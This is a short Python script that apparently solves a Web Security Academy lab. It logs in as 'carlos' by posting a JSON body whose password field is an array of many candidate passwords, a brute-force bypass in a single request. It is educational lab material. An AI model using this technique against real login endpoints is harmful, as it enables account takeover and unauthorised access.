from web_security_academy.core.utils import auth_lab_passwords
from web_security_academy.core.logger import logger


def solve_lab(session):
    passwords = auth_lab_passwords()
    logger.info("Logging in using the following JSON:")
    data = {"username": "carlos", "password": passwords}
    logger.info(data)

    resp = session.post_path("/login", json=data, allow_redirects=False)
    if resp.status_code == 200:
        logger.failure("Unable to log in as carlos.")
        return
    else:
        logger.success("Successfully logged in as carlos.")
        session.get_path(resp.headers["Location"])
